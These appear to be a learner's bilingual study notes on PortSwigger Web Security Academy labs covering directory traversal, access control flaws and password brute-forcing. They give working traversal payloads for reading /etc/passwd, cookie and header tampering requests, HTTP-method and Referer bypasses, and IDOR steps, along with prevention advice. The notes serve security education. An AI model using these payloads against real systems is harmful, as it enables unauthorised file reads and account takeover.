# Directory traversal

## 前置

### 意义

1、目录遍历（也称为文件路径遍历）是一个Web安全漏洞，使得攻击者能够读取运行应用程序的服务器上的任意文件（包括应用程序代码和数据、后端系统的凭据以及敏感的操作系统文件）

2、在某些情况下，攻击者可能能够写入服务器上的任意文件，从而允许他们修改应用程序数据或行为，并最终完全控制服务器

#### 通过目录遍历阅读任意文件

```
1、销售商品图像的购物应用程序：
图像通过HTML加载，如
<img src="/loadImage?filename=218.png">
 
 
该loadImage图像URL采用filename参数并返回指定文件的内容
 
映像文件本身存储在磁盘上的位置/var/www/images/。为返回映像，应用程序将请求的文件名附加到此基目录，并使用文件系统API读取文件的内容。
 
文件路径：/var/www/images/218.png
```

```
2、攻击者：
 
如果应用程序未对目录遍历进行防御，请求以下URL，从服务器的文件系统中检索任意文件： 
https://insecure-website.com/loadImage?filename=../../../etc/passwd
 
这将导致应用程序从以下文件路径读取：
/var/www/images/../../../etc/passwd
（../表示向上一级目录）
 
Unix的操作系统上：  ../
Windows：         ../ and ..\ 都是有效的目录遍历序列
 
系统文件：
https://insecure-website.com/loadImage?filename=..\..\..\windows\win.ini
```

## Lab1

### 题目

实验1：文件路径遍历（简单）

```
Lab: File path traversal, simple case
APPRENTICE

This lab contains a file path traversal vulnerability in the display of product images.

To solve the lab, retrieve the contents of the /etc/passwd file.
```

### 答案

找到相关可能会目录穿越的地方

```
?filename=
```

<img src=".\图片\Snipaste_2023-08-01_15-21-08.png" alt="Snipaste_2023-08-01_15-21-08" style="zoom:80%;" />

## Lab2

实验2：文件路径遍历（用绝对路径旁路阻止遍历序列）

### 前置

```
对于../等的限制
将用户输入放置到文件路径中的应用程序实现了某种类型的防御路径遍历攻击，而这些攻击通常可以被绕过

如果应用程序从用户提供的文件名中剥离或阻止目录遍历序列，那么就有可能使用各种技术绕过防御

如，使用文件系统根目录的绝对路径（filename=/etc/passwd）直接引用文件，而不使用任何遍历序列。
```

### 题目

```
Lab: File path traversal, traversal sequences blocked with absolute path bypass
PRACTITIONER

This lab contains a file path traversal vulnerability in the display of product images.

The application blocks traversal sequences but treats the supplied filename as being relative to a default working directory.

To solve the lab, retrieve the contents of the /etc/passwd file.
```

### 答案

```http
https://0aac008403198b5a80f0766f003b00a0.web-security-academy.net/image?filename=/etc/passwd
```

## Lab3

### 前置

嵌套遍历序列

如....// or ....\/ ，当内部序列被剥离时（只过滤一遍），它将恢复为简单的遍历序列

### 题目

实验3：文件路径遍历（非递归地剥离遍历序列）

```
Lab: File path traversal, traversal sequences stripped non-recursively
PRACTITIONER

This lab contains a file path traversal vulnerability in the display of product images.

The application strips path traversal sequences from the user-supplied filename before using it.

To solve the lab, retrieve the contents of the /etc/passwd file.
```

### 答案

双写绕过

```
....//....//....//etc/passwd
```

## Lab4

### 前置

#### 编码绕过

1、除去遍历序列：在某些上下文中，如在URL路径或filename的参数multipart/form-data请求时，Web服务器可能会在将输入传递到应用程序之前去除任何目录遍历序列。

2、编码绕过：有时可以通过**URL编码**或甚至**双URL编码**来绕过这种清理，`../` 字符，一次编码 `%2e%2e%2f`、二次编码 `%252e%252e%252f` 。各种非标准编码，如 `..%c0%af` 或  `..%ef%bc%8f` ，也可能起到作用

3、工具：BP Intruder 提供了一个预定义的负载列表（将GitHub或自己收集的特殊编码导入，观察哪些可以使用），其中包含各种可供尝试的编码路径遍历序列。 

### 题目

```
Lab: File path traversal, traversal sequences stripped with superfluous URL-decode
PRACTITIONER

This lab contains a file path traversal vulnerability in the display of product images.

The application blocks input containing path traversal sequences. It then performs a URL-decode of the input before using it.

To solve the lab, retrieve the contents of the /etc/passwd file.
```

### 答案

双 url 编码 / 

```
..%252f..%252f..%252fetc/passwd
```

## Lab5

### 前置

要求用户提供的文件名必须以预期的基文件夹开头

如，`/var/www/images`

需要包括基本文件夹，加上遍历序列：

```
filename=/var/www/images/../../../etc/passwd
```

### 题目

```
Lab: File path traversal, validation of start of path
PRACTITIONER

This lab contains a file path traversal vulnerability in the display of product images.

The application transmits the full file path via a request parameter, and validates that the supplied path starts with the expected folder.

To solve the lab, retrieve the contents of the /etc/passwd file.
```

### 答案

```
/var/www/images/../../../etc/passwd
```

## Lab6

### 前置

文件扩展名固定

应用程序要求用户提供的文件名必须以预期的文件扩展名（如.png）结尾，则可以使用空字节在所需扩展名之前有效地终止文件路径，如

`filename=../../../etc/passwd%00.png`（实战中可能得考虑更多办法，如在hex中改为%0a换行截断等方法）

### 题目

```
Lab: File path traversal, validation of file extension with null byte bypass
PRACTITIONER

This lab contains a file path traversal vulnerability in the display of product images.

The application validates that the supplied filename ends with the expected file extension.

To solve the lab, retrieve the contents of the /etc/passwd file.
```

### 答案

就是我们常说的 00 截断

```http
https://0af200cc03133ecc834a9c48001a0075.web-security-academy.net/image?filename=../../../etc/passwd%00.png
```

## 如何防止目录遍历攻击

```
1、防止文件路径遍历漏洞的最有效方法是完全避免将用户提供的输入传递给文件系统API。许多执行此操作的应用程序函数可以重写，以便以更安全的方式提供相同的行为。

2、如果认为将用户提供的输入传递给文件系统API是不可避免的，那么应该同时使用两层防御来防止攻击：

————
（2）白名单（输入前）：应用程序应该在处理用户输入之前对其进行验证。理想情况下，验证应该与允许值的白名单进行比较。如果对于所需的功能来说这是不可能的，那么验证应该验证输入是否只包含允许的内容，比如纯字母数字字符。

————
（2）符合路径规范（输入后）：验证提供的输入后，应用程序应将输入附加到基目录，并使用平台文件系统API规范化路径。应用程序应验证规范化路径是否从预期的基目录开始。
```

# Access control vulnerabilities

[Access control vulnerabilities and privilege escalation | Web Security Academy (portswigger.net)](https://portswigger.net/web-security/access-control#what-is-access-control)

## Lab1

### 前置

#### Unprotected functionality

At its most basic, vertical privilege escalation arises where an application does not enforce any protection over sensitive functionality. For example, administrative functions might be linked from an administrator's welcome page but not from a user's welcome page. However, a user might simply be able to access the administrative functions by browsing directly to the relevant admin URL.

For example, a website might host sensitive functionality at the following URL:

```
https://insecure-website.com/admin
```

This might in fact be accessible by any user, not only administrative users who have a link to the functionality in their user interface. In some cases, the administrative URL might be disclosed in other locations, such as the `robots.txt` file:

```
https://insecure-website.com/robots.txt
```

Even if the URL isn't disclosed anywhere, an attacker may be able to use a wordlist to brute-force the location of the sensitive functionality.

### 题目

```
Lab: Unprotected admin functionality
APPRENTICE

This lab has an unprotected admin panel.

Solve the lab by deleting the user carlos
```

### 答案

例如 robots.txt ，为君子协议，防君子不防小人

<img src=".\图片\Snipaste_2023-08-01_16-10-36.png" alt="Snipaste_2023-08-01_16-10-36" style="zoom:67%;" />

在这里找到了后台地址

```http
https://0a03002b035c70c68301d73f00a000af.web-security-academy.net/administrator-panel
```

这里没有账号密码，直接操作功能点，删除用户即可

<img src=".\图片\Snipaste_2023-08-01_16-11-25.png" alt="Snipaste_2023-08-01_16-11-25" style="zoom:80%;" />

## Lab2

### 前置

In some cases, sensitive functionality is not robustly protected but is concealed by giving it a less predictable URL: so called security by obscurity. Merely hiding sensitive functionality does not provide effective access control since users might still discover the obfuscated URL in various ways.

For example, consider an application that hosts administrative functions at the following URL:

```http
https://insecure-website.com/administrator-panel-yb556
```

This might not be directly guessable by an attacker. However, the application might still leak the URL to users. For example, the URL might be disclosed in JavaScript that constructs the user interface based on the user's role:

```html
<script> var isAdmin = false; if (isAdmin) { 	... 	var adminPanelTag = document.createElement('a'); 	adminPanelTag.setAttribute('https://insecure-website.com/administrator-panel-yb556'); 	adminPanelTag.innerText = 'Admin panel'; 	... } </script>
```

This script adds a link to the user's UI if they are an admin user. However, the script containing the URL is visible to all users regardless of their role.

总结下，就是可能在网页加载的 js 文件里查找到敏感 url 

### 题目

```
Lab: Unprotected admin functionality with unpredictable URL
APPRENTICE

This lab has an unprotected admin panel. It's located at an unpredictable location, but the location is disclosed somewhere in the application.

Solve the lab by accessing the admin panel, and using it to delete the user carlos.
```

### 答案

在源码里寻找敏感的web路径

<img src=".\图片\Snipaste_2023-08-02_14-55-55.png" alt="Snipaste_2023-08-02_14-55-55" style="zoom:80%;" />

得到后台地址

```http
https://0a0e00be04b9684580540d6f001e00a8.web-security-academy.net/admin-g89end
```

于是再直接操作功能点删除用户，即完成题目

## Lab3

### 前置

#### Parameter-based access control methods

Some applications determine the user's access rights or role at login, and then store this information in a user-controllable location, such as a hidden field, cookie, or preset query string parameter. The application makes subsequent access control decisions based on the submitted value. For example:

```
https://insecure-website.com/login/home.jsp?admin=true 
https://insecure-website.com/login/home.jsp?role=1
```

This approach is fundamentally insecure because a user can simply modify the value and gain access to functionality to which they are not authorized, such as administrative functions.

简单来说，就是权限控制的方式很明显很单一，而且是检测用户可控输入来进行权限验证的

### 题目

```
Lab: User role controlled by request parameter
APPRENTICE

This lab has an admin panel at /admin, which identifies administrators using a forgeable cookie.

Solve the lab by accessing the admin panel and using it to delete the user carlos.

You can log in to your own account using the following credentials: wiener:peter
```

### 答案

正常用户登录观察 url 与数据包的特征

<img src=".\图片\Snipaste_2023-08-02_15-02-41.png" alt="Snipaste_2023-08-02_15-02-41" style="zoom:80%;" />

```http
GET /my-account?id=wiener HTTP/2
Host: 0a5100b404a8ce718173cc6c00190064.web-security-academy.net
Cookie: Admin=false; session=sAj0mgLcDl1yl9lCkUHwPPZrbSZzGi4n
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.74 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Sec-Ch-Ua: "(Not(A:Brand";v="8", "Chromium";v="99"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Referer: https://0a5100b404a8ce718173cc6c00190064.web-security-academy.net/login
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
```

尝试把 数据包中的 Cookie 中的 Admin 字段改为 true，即可操作管理员的页面

<img src=".\图片\Snipaste_2023-08-02_15-06-23.png" alt="Snipaste_2023-08-02_15-06-23" style="zoom:80%;" />

接下来操作功能点的删除用户即可，还是记得修改为 `Admin=true`

```http
GET /admin/delete?username=carlos HTTP/2
Host: 0a5100b404a8ce718173cc6c00190064.web-security-academy.net
Cookie: Admin=true; session=sAj0mgLcDl1yl9lCkUHwPPZrbSZzGi4n
Sec-Ch-Ua: "(Not(A:Brand";v="8", "Chromium";v="99"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.74 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0a5100b404a8ce718173cc6c00190064.web-security-academy.net/admin
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
```

## Lab4

### 题目

```
Lab: User role can be modified in user profile
APPRENTICE

This lab has an admin panel at /admin. It's only accessible to logged-in users with a roleid of 2.

Solve the lab by accessing the admin panel and using it to delete the user carlos.

You can log in to your own account using the following credentials: wiener:peter
```

### 答案

登录普通用户，查看更改邮箱的数据包

<img src=".\图片\Snipaste_2023-08-02_15-17-29.png" alt="Snipaste_2023-08-02_15-17-29" style="zoom:80%;" />

我们可以尝试在请求中加上 `roleid:2` ，看看响应中的 roleid 有无变化

<img src=".\图片\Snipaste_2023-08-02_15-19-31.png" alt="Snipaste_2023-08-02_15-19-31" style="zoom:80%;" />

修改后便可以使用普通用户身份查看后台管理页面信息

<img src=".\图片\Snipaste_2023-08-02_15-20-56.png" alt="Snipaste_2023-08-02_15-20-56" style="zoom:80%;" />

## Lab5

### 前置

#### Broken access control resulting from platform misconfiguration

Some applications enforce access controls at the platform layer by restricting access to specific URLs and HTTP methods based on the user's role. For example an application might configure rules like the following:

```
DENY: POST, /admin/deleteUser, managers
```

This rule denies access to the `POST` method on the URL `/admin/deleteUser`, for users in the managers group. Various things can go wrong in this situation, leading to access control bypasses.

Some application frameworks support various non-standard HTTP headers that can be used to override the URL in the original request, such as `X-Original-URL` and `X-Rewrite-URL`. If a web site uses rigorous front-end controls to restrict access based on URL, but the application allows the URL to be overridden via a request header, then it might be possible to bypass the access controls using a request like the following:

```http
POST / HTTP/1.1 X-Original-URL: /admin/deleteUser ...
```

有些应用会支持非标准的请求头，比如：允许”`X-Original-URL`or`X-Rewrite-URL`“覆盖目标url值

### 题目

```
Lab: URL-based access control can be circumvented
PRACTITIONER

This website has an unauthenticated admin panel at /admin, but a front-end system has been configured to block external access to that path. However, the back-end application is built on a framework that supports the X-Original-URL header.

To solve the lab, access the admin panel and delete the user carlos
```

### 答案

尝试在请求包中加上 `X-Original-URL: /invalid` ，结果显示 404，这样很可能 `/invalid` 路径覆盖了原来的 `/`  路径

<img src=".\图片\Snipaste_2023-08-02_15-30-45.png" alt="Snipaste_2023-08-02_15-30-45" style="zoom:67%;" />

于是用这个 `X-Original-URL: /admin` 来尝试绕过检测访问后台

<img src=".\图片\Snipaste_2023-08-02_15-38-36.png" alt="Snipaste_2023-08-02_15-38-36" style="zoom:67%;" />

找到删除用户的链接，

```
/admin/delete?username=carlos
```

再拼接数据包

<img src=".\图片\Snipaste_2023-08-02_15-40-45.png" alt="Snipaste_2023-08-02_15-40-45" style="zoom:80%;" />

## Lab6

### 前置

An alternative attack can arise in relation to the HTTP method used in the request. The front-end controls above restrict access based on the URL and HTTP method. Some web sites are tolerant of alternate HTTP request methods when performing an action. If an attacker can use the `GET` (or another) method to perform actions on a restricted URL, then they can circumvent the access control that is implemented at the platform layer.

### 题目

```
Lab: Method-based access control can be circumvented
PRACTITIONER

This lab implements access controls based partly on the HTTP method of requests. You can familiarize yourself with the admin panel by logging in using the credentials administrator:admin.

To solve the lab, log in using the credentials wiener:peter and exploit the flawed access controls to promote yourself to become an administrator.
```

### 答案

1. Log in using the admin credentials.
2. Browse to the admin panel, promote `carlos`, and send the HTTP request to Burp Repeater.
3. Open a private/incognito browser window, and log in with the non-admin credentials.
4. Attempt to re-promote `carlos` with the non-admin user by copying that user's session cookie into the existing Burp Repeater request, and observe that the response says "Unauthorized".
5. Change the method from `POST` to `POSTX` and observe that the response changes to "missing parameter".
6. Convert the request to use the `GET` method by right-clicking and selecting "Change request method".
7. Change the username parameter to your username and resend the request.

就是修改 Cookie 后使普通用户的身份来触发管理员才能执行的功能点，显示 `Unauthorized` 

更改请求方式从 POST 到 XPOST，显示 `missing parameter` 

再把请求方式改为 get，则成功以普通用户的身份执行管理员的操作功能

## Lab7

### 前置

#### Broken access control resulting from URL-matching discrepancies

When routing incoming requests, websites vary in how strictly the path must match a defined endpoint. For example, they may be tolerant of inconsistent capitalization, so a request to `/ADMIN/DELETEUSER` may still be mapped to the same `/admin/deleteUser` endpoint. This isn't an issue in itself, but if the access control mechanism is less tolerant, it may treat these as two distinct endpoints and fail to enforce the appropriate restrictions as a result.

Similar discrepancies can arise if developers using the Spring framework have enabled the `useSuffixPatternMatch` option. This allows paths with an arbitrary file extension to be mapped to an equivalent endpoint with no file extension. In other words, a request to `/admin/deleteUser.anything` would still match the `/admin/deleteUser` pattern. Prior to Spring 5.3, this option is enabled by default.

On other systems, you may encounter discrepancies in whether `/admin/deleteUser` and `/admin/deleteUser/` are treated as a distinct endpoints. In this case, you may be able to bypass access controls simply by appending a trailing slash to the path.

#### Horizontal privilege escalation

Horizontal privilege escalation arises when a user is able to gain access to resources belonging to another user, instead of their own resources of that type. For example, if an employee should only be able to access their own employment and payroll records, but can in fact also access the records of other employees, then this is horizontal privilege escalation.

Horizontal privilege escalation attacks may use similar types of exploit methods to vertical privilege escalation. For example, a user might ordinarily access their own account page using a URL like the following:

```
https://insecure-website.com/myaccount?id=123
```

Now, if an attacker modifies the `id` parameter value to that of another user, then the attacker might gain access to another user's account page, with associated data and functions.

### 题目

```
Lab: User ID controlled by request parameter
APPRENTICE

This lab has a horizontal privilege escalation vulnerability on the user account page.

To solve the lab, obtain the API key for the user carlos and submit it as the solution.

You can log in to your own account using the following credentials: wiener:peter
```

### 答案

简单的横向越权，id 参数为鉴权特征

先登录 `wiener` 用户， 我们把 id 参数从  `wiener` 改为 `carlos`

```
https://0a1b00d904531af380c9711100900052.web-security-academy.net/my-account?id=wiener
https://0a1b00d904531af380c9711100900052.web-security-academy.net/my-account?id=carlos
```

于是就横向越权到 `carlos` 用户的主页了

提交 carlos 的 apikey 即可完成题目

<img src=".\图片\Snipaste_2023-08-02_16-15-09.png" alt="Snipaste_2023-08-02_16-15-09" style="zoom:80%;" />

## Lab8

### 前置

in some applications, the exploitable parameter does not have a predictable value. For example, instead of an incrementing number, an application might use globally unique identifiers (GUIDs) to identify users. Here, an attacker might be unable to guess or predict the identifier for another user. However, the GUIDs belonging to other users might be disclosed elsewhere in the application where users are referenced, such as user messages or reviews.

### 题目

```
Lab: User ID controlled by request parameter, with unpredictable user IDs
APPRENTICE

This lab has a horizontal privilege escalation vulnerability on the user account page, but identifies users with GUIDs.

To solve the lab, find the GUID for carlos, then submit his API key as the solution.

You can log in to your own account using the following credentials: wiener:peter
```

### 答案

先找到一份 carlos 用户发表的博文，观察 url，有特殊的 userId 字段

```http
https://0abe00e803e1d56e805f548e007b007b.web-security-academy.net/blogs?userId=b901979a-565c-4b32-8777-16b55d1ac536
```

再登录已知的用户 wiener ，查看 url

```http
https://0abe00e803e1d56e805f548e007b007b.web-security-academy.net/my-account?id=da6a7881-06c9-4dee-87e4-c3fa48fa760a
```

当我们上面的 id 改为 carlos 用户的  userid 的值

```http
https://0abe00e803e1d56e805f548e007b007b.web-security-academy.net/my-account?id=b901979a-565c-4b32-8777-16b55d1ac536
```

  成功越权到 carlos 用户 的 主页

<img src=".\图片\Snipaste_2023-08-02_16-24-03.png" alt="Snipaste_2023-08-02_16-24-03" style="zoom:80%;" />

## Lab9

### 前置

In some cases, an application does detect when the user is not permitted to access the resource, and returns a redirect to the login page. However, the response containing the redirect might still include some sensitive data belonging to the targeted user, so the attack is still successful.

### 题目

```
Lab: User ID controlled by request parameter with data leakage in redirect
APPRENTICE

This lab contains an access control vulnerability where sensitive information is leaked in the body of a redirect response.

To solve the lab, obtain the API key for the user carlos and submit it as the solution.

You can log in to your own account using the following credentials: wiener:peter
```

### 答案

我们先登录已知用户 wiener ，抓包观察

```http
GET /my-account?id=wiener HTTP/2
Host: 0a6b006003e710c880f19ef100ef005c.web-security-academy.net
Cookie: session=u3eSSL7mgmODe3qJLuTPRIqPy8g2yRA2
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.74 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Sec-Ch-Ua: "(Not(A:Brand";v="8", "Chromium";v="99"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Referer: https://0a6b006003e710c880f19ef100ef005c.web-security-academy.net/login
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
```

再尝试把包发到 bp 的重发器，修改 url 为 `id=carlos`，再重发

虽说显示的 302 跳转，但是仍能在 bp 里拦截到 carlos 用户的主页信息

<img src=".\图片\Snipaste_2023-08-02_16-36-33.png" alt="Snipaste_2023-08-02_16-36-33" style="zoom:80%;" />

## Lab10

### 前置

#### Horizontal to vertical privilege escalation

Often, a horizontal privilege escalation attack can be turned into a vertical privilege escalation, by compromising a more privileged user. For example, a horizontal escalation might allow an attacker to reset or capture the password belonging to another user. If the attacker targets an administrative user and compromises their account, then they can gain administrative access and so perform vertical privilege escalation.

For example, an attacker might be able to gain access to another user's account page using the parameter tampering technique already described for horizontal privilege escalation:

```
https://insecure-website.com/myaccount?id=456
```

If the target user is an application administrator, then the attacker will gain access to an administrative account page. This page might disclose the administrator's password or provide a means of changing it, or might provide direct access to privileged functionality.

### 题目

```
Lab: User ID controlled by request parameter with password disclosure
APPRENTICE

This lab has user account page that contains the current user's existing password, prefilled in a masked input.

To solve the lab, retrieve the administrator's password, then use it to delete the user carlos.

You can log in to your own account using the following credentials: wiener:peter
```

### 答案

先登录已知用户 wiener

```http
https://0adb00750411155681f7d4c400b20077.web-security-academy.net/my-account?id=wiener
```

修改上面 id 参数，为 administrator

发现垂直越权成功

<img src=".\图片\Snipaste_2023-08-02_16-43-58.png" alt="Snipaste_2023-08-02_16-43-58" style="zoom:80%;" />

查看源码中的管理员密码

<img src=".\图片\Snipaste_2023-08-02_16-49-56.png" alt="Snipaste_2023-08-02_16-49-56" style="zoom:80%;" />

再密码登录管理员账号，触发删除用户的功能点即可

```
administrator:5pz6jsu58p2ai049qfoz
```

## Lab11

### 前置

[Insecure direct object references](https://portswigger.net/web-security/access-control/idor)

Insecure direct object references (IDOR) are a subcategory of access control vulnerabilities. IDOR arises when an application uses user-supplied input to access objects directly and an attacker can modify the input to obtain unauthorized access. It was popularized by its appearance in the OWASP 2007 Top Ten although it is just one example of many implementation mistakes that can lead to access controls being circumvented.

### 题目

```
Lab: Insecure direct object references
APPRENTICE

This lab stores user chat logs directly on the server's file system, and retrieves them using static URLs.

Solve the lab by finding the password for the user carlos, and logging into their account.
```

### 答案

一个在线聊天的功能点，操作下抓包

<img src=".\图片\Snipaste_2023-08-02_17-07-41.png" alt="Snipaste_2023-08-02_17-07-41" style="zoom:80%;" />

<img src=".\图片\Snipaste_2023-08-02_17-07-31.png" alt="Snipaste_2023-08-02_17-07-31" style="zoom:80%;" />

把文件名改为 1.txt ，在响应中查找到密码

```
5qvhqyilleuesf14tij5
```

登录 carlos 账号即可

## Lab12

### 前置

#### Read more

- [Insecure direct object references (IDOR)](https://portswigger.net/web-security/access-control/idor)

#### Access control vulnerabilities in multi-step processes

Many web sites implement important functions over a series of steps. This is often done when a variety of inputs or options need to be captured, or when the user needs to review and confirm details before the action is performed. For example, administrative function to update user details might involve the following steps:

1. Load form containing details for a specific user.
2. Submit changes.
3. Review the changes and confirm.

Sometimes, a web site will implement rigorous access controls over some of these steps, but ignore others. For example, suppose access controls are correctly applied to the first and second steps, but not to the third step. Effectively, the web site assumes that a user will only reach step 3 if they have already completed the first steps, which are properly controlled. Here, an attacker can gain unauthorized access to the function by skipping the first two steps and directly submitting the request for the third step with the required parameters.

```
1、许多网站通过一系列步骤实现重要功能。当需要捕获各种输入或选项时，或者当用户需要在执行操作之前查看和确认细节时，通常会执行此操作。

如更新用户详细信息的管理功能可能涉及以下步骤：
1、加载包含特定用户详细信息的表单。
2、提交更改
3、查看更改并确认。

2、有时网站会对其中一些步骤实施严格的访问控制，但忽略其他步骤。如假设访问控制已正确应用于第一步和第二步，但未应用于第三步。实际上，网站假设用户只有在他们已经完成了被适当控制的第一步骤的情况下才将到达步骤3。在这里，攻击者可以跳过前两个步骤，直接提交包含所需参数的第三个步骤的请求，从而获得对函数的未授权访问。
```

### 题目

```
Lab: Multi-step process with no access control on one step
PRACTITIONER

This lab has an admin panel with a flawed multi-step process for changing a user's role. You can familiarize yourself with the admin panel by logging in using the credentials administrator:admin.

To solve the lab, log in using the credentials wiener:peter and exploit the flawed access controls to promote yourself to become an administrator.
```

### 步骤

1. Log in using the admin credentials.
2. Browse to the admin panel, promote `carlos`, and send the confirmation HTTP request to Burp Repeater.
3. Open a private/incognito browser window, and log in with the non-admin credentials.
4. Copy the non-admin user's session cookie into the existing Repeater request, change the username to yours, and replay it.



先用一个bp自带浏览器登录 administrator:admin 用户，按流程操作功能点

<img src=".\图片\Snipaste_2023-08-02_17-23-41.png" alt="Snipaste_2023-08-02_17-23-41" style="zoom:80%;" />

<img src=".\图片\Snipaste_2023-08-02_17-24-17.png" alt="Snipaste_2023-08-02_17-24-17" style="zoom:67%;" />

再用另一个 firefox浏览器打开，登录普通用户 `wiener` 的状态记下 Cookie 参数

```
Cookie: session=juaylFerrjhg5T01se7iT71xEHca05dA
```

把这个为登录的session替换到之前管理员操作时的数据包中，流程一显示需要权限

<img src=".\图片\Snipaste_2023-08-02_17-33-42.png" alt="Snipaste_2023-08-02_17-33-42" style="zoom:67%;" />

流程二则直接越权操作成功

<img src=".\图片\Snipaste_2023-08-02_17-39-56.png" alt="Snipaste_2023-08-02_17-39-56" style="zoom:80%;" />

成功修改 wiener 用户为管理员

## Lab13

### 前置

#### Referer-based access control

Some websites base access controls on the `Referer` header submitted in the HTTP request. The `Referer` header is generally added to requests by browsers to indicate the page from which a request was initiated.

For example, suppose an application robustly enforces access control over the main administrative page at `/admin`, but for sub-pages such as `/admin/deleteUser` only inspects the `Referer` header. If the `Referer` header contains the main `/admin` URL, then the request is allowed.

In this situation, since the `Referer` header can be fully controlled by an attacker, they can forge direct requests to sensitive sub-pages, supplying the required `Referer` header, and so gain unauthorized access.

```
1、原理：某些网站基于访问控制Referer HTTP请求中提交的标头。该Referer浏览器通常会在请求中添加一个标头，以指示发起请求的页面。

2、示例：如假设某个应用程序在主管理页上强制实施访问控制/admin，但对于子页面，如/admin/deleteUser用户只检查了Referer标题。如果Referer标头包含主/admin URL，则允许该请求。

3、利用：在这种情况下，由于Referer头可以完全由攻击者控制，他们可以伪造对敏感子页的直接请求，提供所需的Referer头，从而获得未经授权的访问
```

#### 基于位置的访问控制

1、一些网站基于用户的地理位置对资源实施访问控制。如这可以应用于州立法或业务限制适用的银行应用或媒体服务。这些访问控制通常可以通过使用Web代理、VPN或操纵客户端地理定位机制来规避。 

### 题目

```
Lab: Referer-based access control
PRACTITIONER

This lab controls access to certain admin functionality based on the Referer header. You can familiarize yourself with the admin panel by logging in using the credentials administrator:admin.

To solve the lab, log in using the credentials wiener:peter and exploit the flawed access controls to promote yourself to become an administrator.
```

### 答案

操作与 Lab12 一模一样，只是原理不同，这里是 referer 字段的绕过

1. Log in using the admin credentials.
2. Browse to the admin panel, promote `carlos`, and send the HTTP request to Burp Repeater.
3. Open a private/incognito browser window, and log in with the non-admin credentials.
4. Browse to `/admin-roles?username=carlos&action=upgrade` and observe that the request is treated as unauthorized due to the absent Referer header.
5. Copy the non-admin user's session cookie into the existing Burp Repeater request, change the username to yours, and replay it.

## 防御

### How to prevent access control vulnerabilities

Access control vulnerabilities can generally be prevented by taking a defense-in-depth approach and applying the following principles:

- Never rely on obfuscation alone for access control.
- Unless a resource is intended to be publicly accessible, deny access by default.
- Wherever possible, use a single application-wide mechanism for enforcing access controls.
- At the code level, make it mandatory for developers to declare the access that is allowed for each resource, and deny access by default.
- Thoroughly audit and test access controls to ensure they are working as designed.

# Authentication

[Authentication vulnerabilities | Web Security Academy (portswigger.net)](https://portswigger.net/web-security/authentication)

## 前置

### Vulnerabilities in password-based login

In this section, we'll look more closely at some of the most common vulnerabilities that occur in password-based login mechanisms. We'll also suggest ways that these can potentially be exploited. There are even some interactive labs so that you can try and exploit these vulnerabilities yourself.

For websites that adopt a password-based login process, users either register for an account themselves or they are assigned an account by an administrator. This account is associated with a unique username and a secret password, which the user enters in a login form to authenticate themselves.

In this scenario, the mere fact that they know the secret password is taken as sufficient proof of the user's identity. Consequently, the security of the website would be compromised if an attacker is able to either obtain or guess the login credentials of another user.

This can be achieved in a variety of ways, as we'll explore below.

#### Brute-force attacks

A brute-force attack is when an attacker uses a system of trial and error in an attempt to guess valid user credentials. These attacks are typically automated using wordlists of usernames and passwords. Automating this process, especially using dedicated tools, potentially enables an attacker to make vast numbers of login attempts at high speed.

Brute-forcing is not always just a case of making completely random guesses at usernames and passwords. By also using basic logic or publicly available knowledge, attackers can fine-tune brute-force attacks to make much more educated guesses. This considerably increases the efficiency of such attacks. Websites that rely on password-based login as their sole method of authenticating users can be highly vulnerable if they do not implement sufficient brute-force protection.

#### Brute-forcing usernames

Usernames are especially easy to guess if they conform to a recognizable pattern, such as an email address. For example, it is very common to see business logins in the format `firstname.lastname@somecompany.com`. However, even if there is no obvious pattern, sometimes even high-privileged accounts are created using predictable usernames, such as `admin` or `administrator`.

During auditing, check whether the website discloses potential usernames publicly. For example, are you able to access user profiles without logging in? Even if the actual content of the profiles is hidden, the name used in the profile is sometimes the same as the login username. You should also check HTTP responses to see if any email addresses are disclosed. Occasionally, responses contain emails addresses of high-privileged users like administrators and IT support.

#### Brute-forcing passwords

Passwords can similarly be brute-forced, with the difficulty varying based on the strength of the password. Many websites adopt some form of password policy, which forces users to create high-entropy passwords that are, theoretically at least, harder to crack using brute-force alone. This typically involves enforcing passwords with:

- A minimum number of characters
- A mixture of lower and uppercase letters
- At least one special character

However, while high-entropy passwords are difficult for computers alone to crack, we can use a basic knowledge of human behavior to exploit the vulnerabilities that users unwittingly introduce to this system. Rather than creating a strong password with a random combination of characters, users often take a password that they can remember and try to crowbar it into fitting the password policy. For example, if `mypassword` is not allowed, users may try something like `Mypassword1!` or `Myp4$$w0rd` instead.

In cases where the policy requires users to change their passwords on a regular basis, it is also common for users to just make minor, predictable changes to their preferred password. For example, `Mypassword1!` becomes `Mypassword1?` or `Mypassword2!.`

This knowledge of likely credentials and predictable patterns means that brute-force attacks can often be much more sophisticated, and therefore effective, than simply iterating through every possible combination of characters.

